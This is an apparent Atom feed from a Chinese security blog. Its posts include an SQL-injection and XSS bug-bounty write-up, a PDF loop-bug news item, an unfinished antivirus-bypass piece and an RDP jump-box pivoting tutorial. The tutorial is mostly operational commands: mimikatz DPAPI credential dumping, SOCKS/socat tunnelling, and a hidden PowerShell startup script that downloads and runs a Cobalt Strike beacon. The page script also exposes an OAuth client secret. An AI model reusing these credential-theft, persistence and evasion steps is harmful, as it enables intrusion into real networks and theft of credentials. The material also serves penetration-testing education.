<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>即刻安全</title>
  
  <subtitle>即刻安全|致力于网络安全的研究学习平台</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-08-27T12:56:02.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Secist‘blog | 即刻安全是一个专注于网络安全的研究学习平台。致力于为网络安全爱好者，打造氛围良好的技术交流学习平台！本着最初的互联网精神，提供最新的技术文章分享，安全事件跟踪等资讯！</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>即刻安全纯技术交流群</title>
    <link href="http://yoursite.com/jishu.html"/>
    <id>http://yoursite.com/jishu.html</id>
    <published>2018-08-27T20:39:19.000Z</published>
    <updated>2017-08-27T12:56:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br><a id="more"></a></p><p> &nbsp; 其实我自己也想了很多很多，其实有一段时间比较低迷，有想过退出这个圈子，但是最后还是很多位朋友鼓励我，不要放弃，话实话进入这个圈子，也算是刚刚好一年了，个人也是一位业余爱好者的身份，来进行和你们交流和探讨，自己也是忧郁了很久很久，最终 看到咱们即刻群，基本都是整天水群，斗图，我看着实在是不忍心，即刻安全也是我的一部分，我也是其中的一份子，我的开始就是即刻安全！！即刻安全花费了我的很多心血，所以我重新开始整段群，创建此群的初衷就是，无斗图、无广告、无水群的纯技术交流群。<br> &nbsp;<br> 感谢各位朋友粉丝的大力支持，也是才有我们即刻安全的今天。<br> 如有志同道合的朋友，欢迎加入我们即刻安全纯技术交流群：307283889<br> 希望进群的朋友能遵守规则：莫斗图、莫水群，希望能打造更好的技术交流氛围</p><pre><code>特此：即刻安全团体敬上                Demon  2017.8.27</code></pre><p>&nbsp;<br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/BA873B7BBDED07564E11CA6736849726.png" alt="enter description here"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>挖洞经验 | 热门航空网站上的SQLi和XSS漏洞</title>
    <link href="http://yoursite.com/SQLi-Xss.html"/>
    <id>http://yoursite.com/SQLi-Xss.html</id>
    <published>2017-09-12T15:46:42.000Z</published>
    <updated>2017-09-13T11:38:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/15042347237772.jpg" alt="enter description here"><br><a id="more"></a></p><font color="##006000">上个月为了练手，我选择了一个较受欢迎的网站（goodwesite.com）作为我的渗透测试对象。在漏洞挖掘过程中，我发现了该网站存在SQL注入和XSS漏洞。在正式开始文章内容前，让我们先来简单了解下该类漏洞的定义及产生原理。</font><h2 id="什么是SQL注入漏洞？"><a href="#什么是SQL注入漏洞？" class="headerlink" title="什么是SQL注入漏洞？"></a>什么是SQL注入漏洞？</h2><p>此漏洞允许未经身份验证的用户，从受害者的网站数据库中窃取数据，包括敏感用户信息等。</p><h2 id="漏洞产生原因？"><a href="#漏洞产生原因？" class="headerlink" title="漏洞产生原因？"></a>漏洞产生原因？</h2><p>之所以存在该漏洞是因为，goodwebsite在其登录界面对于用户输入的内容未进行正确的消毒处理导致的；这与在原始SQL查询中添加用户输入基本相同。此时黑客只需输入相应的渗透向量，就可能窃取走数据库中的哈希密码和其他敏感用户信息。</p><p>因此，在测试“登录”页面时我随机输入了个用户名和密码，并使用Burp Suite拦截其请求，接着我用Test％27来作为用户名，然后将请求转发给Burp Repeater，并收到一条错误的回复，Response中的错误仿佛像是在发起Request请求。</p><font color="#FF0000"><pre><br>Request:<br>POST /register-login/check.php HTTP/1.1<br>Content-Length: 76<br>Content-Type: application/x-www-form-urlencoded<br>Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724<br>Host: goodwebsite.com<br>Connection: Keep-alive<br>Accept-Encoding: gzip,deflate<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko)<br>Chrome/41.0.2228.0 Safari/537.21<br>Accept: <em>/</em><br>strLogin=Test%27&amp;strPassword=k<br>Response Error:<br>PDOException Object ( [message:protected] =&gt; SQLSTATE[42000]: Syntax error or access viola<br>tion: 1064 You have an error in your SQL syntax; check the manual that corresponds to your My<br>SQL server version for the right syntax to use near Test’ ‘ and <code>valid_id</code> = 1’ at line 1 [string:Exce<br>ption:private] =&gt; [code:protected] =&gt; 42000 [file:protected] =&gt; /var/www/goodwebsite.server.co<br>m/register-login/send.php [line:protected] =&gt; 10 [trace:Exception:private] =&gt; Array ( [0] =&gt; Array<br>( [file] =&gt; /var/www/goodwebsite.server.com/register-login/send.php [line] =&gt; 10 [function] =&gt; q<br>uery [class] =&gt; PDO [type] =&gt; -&gt; [args] =&gt; Array ( [0] =&gt; SELECT * FROM <code>wp_ggg_user</code> WHER<br>E <code>login</code> = Test’e ‘ and <code>valid_id</code> = 1; ) [previous:Exception:private] =&gt; [errorInfo] =&gt; Array ( [0] =<br>&gt; 42000 <a href="http://ojg8j426f.bkt.clouddn.com/15042347237772.jpg" target="_blank" rel="external">1</a> =&gt; 1064 <a href="http://ojg8j426f.bkt.clouddn.com/15042347558566.jpg" target="_blank" rel="external">2</a> =&gt; You have an error in your SQL syntax; check the manual that corre<br>&gt; sponds to your MySQL server version for the right syntax to use near Test’ ‘ and <code>valid_id</code><br>&gt; = 1’ at line 1 )<br></pre></font><p>根据初步的判断，我尝试了一些其他的SQL查询，我使用的第一个查询语句是 Test%27and extractvalue(1,concat(0x00a,database()))or’这次出现的错误与上述类似，只是出现了一点小的变化，错误的结尾部分如下：</p><font color="#FF0000"><pre><br>[previous:Exception:private] =&gt;<br> [errorInfo] =&gt; Array<br> (<br> [0] =&gt; HY000<br> <a href="http://ojg8j426f.bkt.clouddn.com/15042347237772.jpg" target="_blank" rel="external">1</a> =&gt; 1105<br> <a href="http://ojg8j426f.bkt.clouddn.com/15042347558566.jpg" target="_blank" rel="external">2</a> =&gt; XPATH syntax error: ‘<br>goodwebsite’<br> )<br></pre></font><p>从以上错误信息中，我们获取到了网站的数据库名称为goodwebsite。</p><p><img src="http://ojg8j426f.bkt.clouddn.com/15042347558566.jpg" alt="enter description here"></p><p>除此之外，我还测试了以下的基本信息查询语句：</p><font color="#FF0000"><pre><br>system_user()<br>@@version<br>database()<br>@@hostname<br>@@datadir<br>@@GLOBAL.VERSION<br>session_user()<br>schema()<br>UUID()<br></pre></font><p>所以，接着我使用的查询语句是Test％27和extractvalue（1，concat（0x00a，system_user（）））或’错误返回信息如下：</p><font color="#FF0000"><pre><br>[previous:Exception:private] =&gt;<br> [errorInfo] =&gt; Array<br> (<br> [0] =&gt; HY000<br> <a href="http://ojg8j426f.bkt.clouddn.com/15042347237772.jpg" target="_blank" rel="external">1</a> =&gt; 1105<br> <a href="http://ojg8j426f.bkt.clouddn.com/15042347558566.jpg" target="_blank" rel="external">2</a> =&gt; XPATH syntax error: ‘<br>goodwebsite@localhost’<br> )<br></pre></font><p><img src="http://ojg8j426f.bkt.clouddn.com/15042347868841.jpg" alt="enter description here"></p><p>通过以上查询测试，足以证明SQL注入漏洞的存在。为了获取更多的信息，我继续使用了第三个查询语句Test％27和extractvalue（1，concat（0x00a，@@ hostname））或’错误返回信息如下： </p><pre>[previous:Exception:private] =>    [errorInfo] => Array        (            [0] => HY000            [1] => 1105            [2] => XPATH syntax error: 'www2.rz.something.com'        )</pre><p><img src="http://ojg8j426f.bkt.clouddn.com/15042348308374.jpg" alt="enter description here"><br>这里，我差点忘了查询目标数据库的版本信息，使用查询语句Test％27和extravtcalue（1，concat（0x00a，@@ version））或“错误返回信息如下：</p><pre>[previous:Exception:private] => [errorInfo] => Array ( [0] => HY000 [1] => 1105 [2] => XPATH syntax error: ‘5.1.73–1+deb6u1-log’ ) </pre> ![enter description here][5]最后，我尝试查询了测试％27和extractvalue（1，concat（0x00a，UUID（））或'错误返回信息如下：<pre>[previous:Exception:private] => [errorInfo] => Array ( [0] => HY000 [1] => 1105 [2] => XPATH syntax error: ‘ab88…..UUDI’ )</pre><p><img src="http://ojg8j426f.bkt.clouddn.com/15042348705946.jpg" alt="enter description here"></p><p>到目前为止，我已经获取到了许多有价值的信息但这还远远不够，为了节省时间我决定使用SQLI扫描神器的SqlMap;来帮助我完成后续的查询任务以下是的SqlMap为我返回的结果。：</p><pre>web server operating system: Linux Debian 6.0 (squeeze)web application technology: Apache 2.2.16, PHP 5.4.42back-end DBMS: MySQL >= 5.0Database: goodwebsite[18 tables]+ — — — — — — — — — — — — -+| wp_bms_log || wp_bms_quiz_lh_answer || wp_bms_quiz_lh_question || wp_bms_quiz_lh_quiz || wp_bms_statistics || wp_bms_user || wp_commentmeta || wp_comments || wp_links || wp_options || wp_postmeta || wp_posts || wp_term_relationships || wp_term_taxonomy || wp_termmeta || wp_terms || wp_usermeta || wp_users |+ — — — — — — — — — — — — -+Then:Table: wp_users[10 columns]+ — — — — — — — — — — -+ — — — — — — — — — — -+| Column | Type |+ — — — — — — — — — — -+ — — — — — — — — — — -+| display_name | varchar(250) || ID | bigint(20) unsigned || user_activation_key | varchar(255) || user_email | varchar(100) || user_login | varchar(60) || user_nicename | varchar(50) || user_pass | varchar(255) || user_registered | datetime || user_status | int(11) || user_url | varchar(100) |+ — — — — — — — — — — -+ — — — — — — — — — — -+</pre><p><img src="http://ojg8j426f.bkt.clouddn.com/15042348927776.jpg" alt="enter description here"></p><p>但基于渗透测试的基本原则，我并没有继续深入下去。</p><h2 id="XSS："><a href="#XSS：" class="headerlink" title="XSS："></a>XSS：</h2><p>在完成对SQLI漏洞的测试后，接着我将测试目标转向了另一个页面goodwebsite.com/register-login/send.php 。同样是一个POST请求，不同的是它带有一个strSendMail =的可输入变量。因此，我测试了以上相同的SQL语句，并获取到了同样的错误返回结果。接着，我测试了一个XSS的有效载荷E’％22（）％26％25 <acx> <script％20>提示（/ khizer /）&lt;/ ScRiPt&gt;，请求如下：</script％20></acx></p><p><pre><br>POST /register-login/send.php HTTP/1.1<br>Content-Length: 60<br>Content-Type: application/x-www-form-urlencoded<br>Referer: <a href="http://goodwebsite.com/" target="_blank" rel="external">http://goodwebsite.com/</a><br>Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724<br>Host: goodwebsite.com<br>Connection: Keep-alive<br>Accept-Encoding: gzip,deflate<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21<br>Accept: <em>/</em><br>strSendMail=e’%22()%26%25<acx><script%20>prompt(/khizer/)<br></script%20></acx></pre><br>弹框了！</p><p><img src="http://ojg8j426f.bkt.clouddn.com/15042349115128.jpg" alt="enter description here"><br>之后，我第一时间报告了这两个漏洞的细节，他们在一小时内就进行了修复，并向我发送了感谢信。<br><img src="http://ojg8j426f.bkt.clouddn.com/1504234930148.jpg" alt="enter description here"><br> *参考来源：medium，FB小编secist编译，转载请注明来自FreeBuf.COM</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/15042347237772.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>6年的老漏洞”Loop Bug”重现，几近全部PDF阅读器中招</title>
    <link href="http://yoursite.com/Loop-Bug.html"/>
    <id>http://yoursite.com/Loop-Bug.html</id>
    <published>2017-09-12T15:22:47.000Z</published>
    <updated>2017-09-12T15:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/150458564eeeee5360.jpg" alt="enter description here"><br><a id="more"></a></p><font color="##006000">近日，德国软件开发商HannoBöck称，一个早在2011年就被发现的PDF解析库中的隐蔽bug，如今在大多数主流的PDF阅读器中再次出现。</font><pre>该bug最初是由德国软件开发商Andreas Bogk，在Evince（GNOME桌面环境下的一个PDF，PostScript，DjVu，TIFF与DVI文档查看工具）的解析器组件中被发现的，当时Andreas Bogk还协助Evince修复了该漏洞，并在2011年的混沌通信大会上展示了该漏洞。Bogk发现具有特定结构的PDF文档（PDF文件交叉引用内部参照表）会导致Evince应用程序进入一个死循环，并占用本地所有的CPU资源，迅速耗尽内存，从而使Evince应用程序崩溃。这个bug被大多数人所忽略，人们从未将它视为一个主要的安全问题，认为这只是一个安装在Linux桌面上的小应用程序。</pre><h2 id="六年前的bug在主流的PDF阅读器中重现"><a href="#六年前的bug在主流的PDF阅读器中重现" class="headerlink" title="六年前的bug在主流的PDF阅读器中重现"></a>六年前的bug在主流的PDF阅读器中重现</h2><p>六年后的今天，曾经被人们忽视的小问题，如今却转变成了一个大问题。Böck表示，已经在众多知名的PDF阅读器中发现了类似的问题。</p><p>例如，Böck在PDFium中发现了Bogk当时报告的“loop”bug，该库允许Chrome无需任何插件就可以在浏览器中，渲染PDF文档。</p><p>Firefox中的pdf.js库也受到影响。此外，Pdf.js库还被用在了GitHub上，用于在网站界面渲染PDF文档，而无需用户下载文件并在第三方应用程序中查看。因此，GitHub的实现也极易受到“loop”bug的影响。</p><p>在Windows 8或更高版本中默认安装的Windows Runtime PDF Renderer库或WinRT PDF也受此影响。这是Edge内置的PDF查看器，也是Windows“Reader App”的默认PDF解析器。</p><p>类似地，开源PDF解析器（如Ghostscript和QPDF）同样也受到了影响。这也意味着许多其他已经安装部署Ghostscript或QPDF的web和桌面，都将受到该漏洞的影响。</p><p>Böck已向所有受影响的产品厂商报告了旧的错误信息，他们正准备为此推出补丁程序。</p><h2 id="Adobe-Reader未受影响"><a href="#Adobe-Reader未受影响" class="headerlink" title="Adobe Reader未受影响"></a>Adobe Reader未受影响</h2><p>Adobe Reader和Apple的OS X内置PDF查看器并未受到影响。</p><p>研究人员说，他主要是通过Fuzzing技术来对每个项目库进行测试后发现问题的。Fuzzing是一种基本的安全测试技术，用于测试人员分析程序的异常输出响应。Google的安全专家非常热衷于该技术，并极力向任何有兴趣倾听他们建议的人推荐该技术。</p><p>Böck指责受影响项目的管理员，没有运行更新的测试套件。软件开发人员不应该在没有成功通过测试套件的情况下，发布新版本的应用程序。Böck同时还建议PDF应用程序，将Bogk“loop bug”演示文件添加到他们的测试用例中。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/150458564eeeee5360.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全资讯" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
    
      <category term="安全资讯" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
  </entry>
  
  <entry>
    <title>如何使用RDP跳过网络隔离？</title>
    <link href="http://yoursite.com/RDP.html"/>
    <id>http://yoursite.com/RDP.html</id>
    <published>2017-09-12T14:11:22.000Z</published>
    <updated>2017-09-12T15:17:40.000Z</updated>
    
    <content type="html"><![CDATA[<font color="##006000">本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：</font><p><img src="http://ojg8j426f.bkt.clouddn.com/15045039824116.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="1-简要说明："><a href="#1-简要说明：" class="headerlink" title="1.简要说明："></a>1.简要说明：</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">LAN是一种扁平的工作站和服务器网络。</div><div class="line">一些服务器（包括RDP跳转盒）无法与Internet连接。</div><div class="line">工作站可以通过代理访问Internet。</div><div class="line">RDP跳转盒是LAN上唯一可以与“Secret Network（隔离网络）”通话的主机，仅限于3389端口。</div><div class="line">rasta-lan.local和secret-lan.local是两种不同的网络。</div><div class="line">LAN网段为：10.0.0.0/16；隔离网络网段为：172.16.0.0/24。</div></pre></td></tr></table></figure><p>通过该方案，渗透测试人员可以在其渗透主机（Windows 10）上打开远程桌面连接，并利用RDP直接连接到隔离/受保护的目标服务器上。</p><h2 id="2-场景预设"><a href="#2-场景预设" class="headerlink" title="2.场景预设"></a>2.场景预设</h2><p>我们已有一个名为rasta_mouse的域用户组成员的beacon(信标)。通过查询目标服务器，以确定哪些用户/组已被授予了RDP访问权限。</p><p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-NetLocalGroup -ComputerName RDP01 -GroupName “Remote Desktop Users”<br>ComputerName : RDP01<br>AccountName  : rasta-lan.local/Jump Box Users<br>IsDomain     : True<br>IsGroup      : True<br>SID          : S-1-5-21-2294392343-2072776990-791666979-1106<br></pre></font><br>谁是Jump Box（跳转盒）用户组的成员？</p><p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-NetGroupMember -GroupName “Jump Box Users”<br>GroupDomain  : rasta-lan.local<br>GroupName    : Jump Box Users<br>MemberDomain : rasta-lan.local<br>MemberName   : rasta_mouse_adm<br>MemberSID    : S-1-5-21-2294392343-2072776990-791666979-1107<br>IsGroup      : False<br>MemberDN     : CN=Rasta Mouse (Admin),CN=Users,DC=rasta-lan,DC=local<br></pre></font><br>rasta_mouse有两个单独的帐户，这意味着我们需要获取到rasta_mouse_adm的账户凭据才能继续我们下一步的操作。这里我将探讨两种可能的方法。</p><h2 id="3-凭据管理器-amp-DPAPI"><a href="#3-凭据管理器-amp-DPAPI" class="headerlink" title="3.凭据管理器 &amp; DPAPI"></a>3.凭据管理器 &amp; DPAPI</h2><p>如果用户选择了保存RDP凭据，并且你也有SeDebugPrivilege权限来执行此操作，那么这将是最有趣和有效的办法。</p><p>在凭据管理器GUI中的Windows凭据：<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/15045040157501.jpg" alt="enter description here"><br>&nbsp;</p><p>你也可以在命令行上获取：</p><p><font color="#FF0000"><pre><br>beacon&gt; shell vaultcmd /listcreds:”Windows Credentials” /all<br>Credentials in vault: Windows Credentials<br>Credential schema: Windows Domain Password Credential<br>Resource: Domain:target=TERMSRV/rdp01<br>Identity: LAN\rasta_mouse_adm<br>Hidden: No<br>Roaming: No<br>Property (schema element id,value): (100,2)<br></pre></font><br>这些凭据存储在用户目录C:\Users\<username>\AppData\Local\Microsoft\Credentials*中。</username></p><p><font color="#FF0000"><pre><br>beacon&gt; powerpick Get-ChildItem C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\ -Force<br>    Directory: C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials<br>Mode                LastWriteTime         Length Name<br>-a-hs-       02/09/2017     13:37            412 2647629F5AA74CD934ECD2F88D64ECD0<br>-a-hs-       30/08/2017     19:28          11204 DFBE70A7E5CC19A398EBF1B96859CE5D<br></pre></font><br>现在我们来查看<img src="http://ojg8j426f.bkt.clouddn.com/1505228076535.jpg" alt="C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 。"></p><p><font color="#FF0000"><pre><br>beacon&gt; mimikatz dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0<br>  dwVersion          : 00000001 - 1<br>  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}<br>  dwMasterKeyVersion : 00000001 - 1<br>  guidMasterKey      : {6515c6ef-60cd-4563-a3d5-3d70a6bc6992}<br>  dwFlags            : 20000000 - 536870912 (system ; )<br>  dwDescriptionLen   : 00000030 - 48<br>  szDescription      : Local Credential Data<br>  algCrypt           : 00006603 - 26115 (CALG_3DES)<br>  dwAlgCryptLen      : 000000c0 - 192<br>  dwSaltLen          : 00000010 - 16<br>  pbSalt             : be072ec0f54a6ceaffd09fe2275d72f9<br>  dwHmacKeyLen       : 00000000 - 0<br>  pbHmackKey         :<br>  algHash            : 00008004 - 32772 (CALG_SHA1)<br>  dwAlgHashLen       : 000000a0 - 160<br>  dwHmac2KeyLen      : 00000010 - 16<br>  pbHmack2Key        : a3579f9e295013432807757d3bcdf82e<br>  dwDataLen          : 000000d8 - 216<br>  pbData             : 0bad8cb788a364061fa1eff57c3cbc83c8aa198c95537f66f2f973c8fe5e7210626c58423b84b55f604cff2b23165b690ad7fa7ad03d80051cb7c1a0e987f36586ede1bd7ff7e2b9f1d3cbc4b8f1b8557ab1be3402d3bfe39b1682353504ff156615b44ea83aa173c3f7830b65bf9202d823932ca69413fcb8bca1a76893c7cbab7e0ee0bbe9269a8b9f65e88e099334177be15cf977a44b77ba6e829c89303ef4764f5fd661e722c7508ad2e01a41f9cd079fc7ce5a8dba90c94a2314941674ad47567bd9c980548f809fe72ce4895b6a56cb9148c47afb<br>  dwSignLen          : 00000014 - 20<br>  pbSign             : 43559a2b2e9b11bc4b56828a1d2ece489c9dfd52<br>  </pre></font><br>以上我们需要关注的是pbData和guidMasterKey的信息。pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。这里LSASS已经在其缓存中存有这个key – 因此我们可以使用SeDebugPrivilege获取。</p><p><font color="#FF0000"><pre>beacon&gt; mimikatz !sekurlsa::dpapi  </pre></font><br>在输出信息中，我们找到了我们需要的GUID和关联的MasterKey。</p><p><font color="#FF0000"><pre></pre></font></p><pre><code>* 00000000* GUID      :  {6515c6ef-60cd-4563-a3d5-3d70a6bc6992}* Time      :  02/09/2017 13:37:51* MasterKey :  95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b* sha1(key) :  89f35906909d78c84ba64af38a2bd0d1d96a0726</code></pre><p><br>如果我们在交互模式下运行mimikatz，它会自动将这些密钥添加到我们的dpapi缓存中，并在尝试解密凭据时使用它们。但是，通过Cobalt Strike运行mimikatz不允许我们保留相同的会话（至少我不知道该如何保留）。所以，我们必须要拿到key并手动使用它。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1505228546926.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="4-RDP01"><a href="#4-RDP01" class="headerlink" title="4.RDP01"></a>4.RDP01</h2><p>这些凭据将用于RDP进入跳转盒 – 因为是直接从我们的渗透机器上这样做。所以，我们先在我们当前的信标上设置一个SOCKS代理。</p><p><font color="#FF0000"><pre><br>beacon&gt; socks 1337<br>[+] started SOCKS4a server on: 1337<br></pre></font><br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">SSH进入你的Teamserver，并安装socat和proxychains（如果还未安装）。</div><div class="line">修改proxychains.conf配置文件，以在端口1337上使用127.0.0.1。</div><div class="line">然后用proxychains运行socat – &gt; proxychains -&gt; proxychains socat TCP4-LISTEN:3389,fork TCP4:10.0.0.100:3389。</div><div class="line">这将允许我们的Teamserver在3389端口监听，任何进入该该端口的流量，都将被重定向到socks代理10.0.0.100:3389上。</div></pre></td></tr></table></figure></p><p>现在，我们已经RDP到了我们的Teamserver的IP地址，我们应该已经在jump box上了…<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/15045040679844.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="5-Persistence"><a href="#5-Persistence" class="headerlink" title="5..Persistence"></a>5..Persistence</h2><p>为了保持对该服务器的持久访问，我们可以进行简单的设置，以便当真正的rasta_mouse_adm用户连接时， 我们可以获取到一个SMB Beacon。</p><p>操作步骤如下：<br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">创建一个无状态PowerShell SMB Beacon payload。</div><div class="line">在你的Teamserver（(web delivery)）上将其托管在/smb。</div><div class="line">在我们当前的beacon创建一个Reverse Port Foward -&gt; rportfwd 8080 178.62.56.134 80。</div><div class="line">创建C:\Users\rasta<span class="emphasis">_mouse_</span>adm\AppData\Roaming\Microsoft</div><div class="line">\Windows\Start Menu\Programs\Startup\startup.bat，并写入以下内容：</div></pre></td></tr></table></figure></p><p><font color="#FF0000"><pre>powershell.exe -nop -w hidden -c “iex((new-object net.webclient).downloadstring(‘http://<br>10.0.1.200:8080/smb’))”</pre></font><br>注销RDP会话。<br>当真正的用户登录时，我们将会在我们屏幕上获取到以下信息：</p><p><font color="#FF0000"><pre><br>09/02 14:19:45 visit from: 178.62.56.134<br>    Request: GET /smb<br>    page Serves /opt/cobaltstrike/uploads/beacon.ps1<br>    null<br></pre></font><br>让我们连接到beacon。</p><p><font color="#FF0000"><pre><br>beacon&gt; link 10.0.0.100<br>[+] established link to child beacon: 10.0.0.100<br></pre></font><br><img src="http://ojg8j426f.bkt.clouddn.com/15045041046706.jpg" alt="enter description here"></p><p><strong>注意：如果用户注销了，我们将会失去beacon；如果仅仅只是断开连接，那么我们将保持连接。</strong></p><h2 id="6-SECRET"><a href="#6-SECRET" class="headerlink" title="6.SECRET"></a>6.SECRET</h2><p>现在我们已经在jump box上了，我们的目标是SECRET。那么，我们该如何进入SECRET呢？</p><p>你实际上我们可以通过键盘记录来获取到我们想要的信息，如下：<br><img src="http://ojg8j426f.bkt.clouddn.com/1505229347612.jpg" alt="enter description here"><br><figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line">停止当前Beacon中的SOCKS代理，以及Teamserver上的proxychains/socat。</div><div class="line"></div><div class="line">在jump box上启动一个新的SOCKS代理（你可以使用相同的端口）。</div><div class="line"></div><div class="line">在你的Teamserver上运行proxychains socat TCP4-LISTEN:3389，fork TCP4:172.16.0.10:3389。</div><div class="line">像之前一样，RDP到Teamsever IP，我们将直接进入到SECRET。</div></pre></td></tr></table></figure></p><p><img src="http://ojg8j426f.bkt.clouddn.com/15045042536097.jpg" alt="enter description here"></p><h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h2><p>不要保存RDP凭据在jump boxes上，建议使用双因素身份认证。DPAPI没有足够的保护。<a href="https://t.co/1lBySQcVYt" target="_blank" rel="external">https://t.co/1lBySQcVYt</a></p><p>— Matthew Dunwoody (@matthewdunwoody) September 2, 2017</p><h2 id="8-欢迎下方一起参与讨论"><a href="#8-欢迎下方一起参与讨论" class="headerlink" title="8.欢迎下方一起参与讨论"></a>8.欢迎下方一起参与讨论</h2><p>&nbsp;</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;##006000&quot;&gt;本文我将向大家演示，如何通过RDP跳转盒进入隔离/受保护的网络。下图是我为该场景制作的拓扑图：&lt;/font&gt;

&lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/15045039824116.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="原创翻译" scheme="http://yoursite.com/categories/%E5%8E%9F%E5%88%9B%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="原创翻译" scheme="http://yoursite.com/tags/%E5%8E%9F%E5%88%9B%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>绕过安全防护敏感检测行为</title>
    <link href="http://yoursite.com/Bypass3.html"/>
    <id>http://yoursite.com/Bypass3.html</id>
    <published>2017-09-12T11:50:23.000Z</published>
    <updated>2017-09-12T13:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/access-dark-web-while-staying-anonymous-with-tor.1280x600-1.jpg" alt="enter description here"><br><a id="more"></a></p><p><font color="#FF0000"> 投稿原作者：jishuzhain</font></p><h2 id="1-思考"><a href="#1-思考" class="headerlink" title="1.思考"></a>1.思考</h2><p>昨天，通过静态免杀可以bypass国内杀软，当我们想执行一些敏感的操作时，……</p><p>有很多时候，在渗透测试中，拿到了Webshell，查看了权限，发现是系统权限，很开心，但是往往防护软件会给你当头一棒，呵呵，添加用户的时候，却被360拦截…</p><p>那么如何解决呢？在这篇文章中，提供了一些思路<a href="http://www.91ri.org/13805.html" target="_blank" rel="external">http://www.91ri.org/13805.html</a> </p><h2 id="2-我有一个大胆的想法"><a href="#2-我有一个大胆的想法" class="headerlink" title="2.我有一个大胆的想法"></a>2.我有一个大胆的想法</h2><p>所以我就假设了一个想法：<br>360安全卫士是一个应用程序，它是如何检测用户是是否添加用户的呢？答案当然是命令行了。<br>假设它获取每一行命令去分析，然后判断是否拦截，那么肯定是使用的系统API吧？要不然程序员会头炸的。<br>大概这样简单的设想，我们就开始验证了。<br>在Windows编程中间，我们经常需要添加用户，删除用户，添加用户组等等功能，那些功能如何实现呢？搜索了一下windows提供的API，文末提高全功能源码。<br><a href="https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/aa370649(VS.85).aspx#</a><br>本文需要的技术背景（visual c++编程基础，dos命令）<br>环境，vm10 360安全卫士最新版，防护全部开启。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/59B7856A-1ED8-47E3-B71D-E18DBD3F6289.png" alt="enter description here"><br>&nbsp;<br>然后再用API添加。</p><p>&nbsp;<br><img 